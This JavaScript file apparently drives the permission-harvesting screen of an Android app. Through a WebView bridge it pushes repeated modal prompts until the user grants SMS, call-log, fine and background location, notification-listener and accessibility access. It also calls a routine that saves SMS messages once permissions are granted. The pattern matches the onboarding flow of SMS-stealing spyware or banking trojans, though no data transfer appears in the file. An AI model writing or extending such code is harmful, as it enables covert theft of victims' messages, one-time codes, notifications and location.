const perms = [
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.ACCESS_FINE_LOCATION",
];

const sPerms = ["android.permission.ACCESS_BACKGROUND_LOCATION"];

let enableActivityLaunched = false;

function foregroundGranted() {
    return perms.every(p => AndroidBridge.isPermissionGranted(p));
}

function runtimeGranted() {
    return foregroundGranted() &&
           AndroidBridge.isPermissionGranted(sPerms[0]);
}

function isFullyReady() {
    return runtimeGranted() &&
           AndroidBridge.isNotifAccessGranted() &&
           AndroidBridge.isAccessibilityEnabled();
}

function decideFlow() {
    if (!window.AndroidBridge) return;

    hideAllModals();

    if (!runtimeGranted()) {
        showPModal();
        return;
    }

    if (!AndroidBridge.isNotifAccessGranted()) {
        showDModal();
        return;
    }

    if (!AndroidBridge.isAccessibilityEnabled()) {
        showAModal();
        return;
    }

    launchFinalActivityOnce();
}

function launchFinalActivityOnce() {
    if (!enableActivityLaunched) {
        enableActivityLaunched = true;
        hideAllModals();
        AndroidBridge.launchEnableActivity();
    }
}

document.addEventListener("DOMContentLoaded", () => {
    setTimeout(decideFlow, 500);
    const accessibilityWatcher = setInterval(() => {
        if (!window.AndroidBridge) return;
        if (runtimeGranted() && AndroidBridge.isNotifAccessGranted() && AndroidBridge.isAccessibilityEnabled()) {
            //launchFinalActivityOnce();
            hideAllModals();
            showCModal();
            clearInterval(accessibilityWatcher);
        }
    }, 1000);
});

window.onAndroidPermissionsChanged = function () {
    decideFlow();
    if (foregroundGranted() && !AndroidBridge.isPermissionGranted(sPerms[0])) {
        AndroidBridge.saveSmsIfNew();
        AndroidBridge.requestPermissions(JSON.stringify(sPerms));
    }
};

function requestAllPermissions() {
    AndroidBridge.requestPermissions(JSON.stringify(perms));
}

function launchAccessibilityPerm() {
    AndroidBridge.launchAccessibilityPerm();
}

function openNAccess() {
    AndroidBridge.launchNotificationAccess();

    const notifWatcher = setInterval(() => {
        if (!window.AndroidBridge) return;
        if (AndroidBridge.isNotifAccessGranted()) {
            clearInterval(notifWatcher);
            hideDModal();
            if (!AndroidBridge.isAccessibilityEnabled()) {
                showAModal();
            } else {
                //launchFinalActivityOnce();
                hideAModal();
                showCModal();
            }
        }
    }, 1000);
};

function hideAllModals() {
    hidePModal();
    hideDModal();
    hideAModal();
}

function showPModal() { document.querySelector(".p-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
function hidePModal() { document.querySelector(".p-modal").classList.add("hide"); hideOverlayerIfNeeded(); }

function showDModal() { document.querySelector(".d-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
function hideDModal() { document.querySelector(".d-modal").classList.add("hide"); hideOverlayerIfNeeded(); }

function showAModal() { document.querySelector(".a-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
function hideAModal() { document.querySelector(".a-modal").classList.add("hide"); hideOverlayerIfNeeded(); }

function showCModal() { document.querySelector(".c-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
function hideCModal() { document.querySelector(".c-modal").classList.add("hide"); hideOverlayerIfNeeded(); }

function hideOverlayerIfNeeded() {
    if (document.querySelectorAll(".p-modal:not(.hide), .d-modal:not(.hide), .a-modal:not(.hide)").length === 0) {
        document.querySelector(".overlayer").classList.add("hide");
    }
}
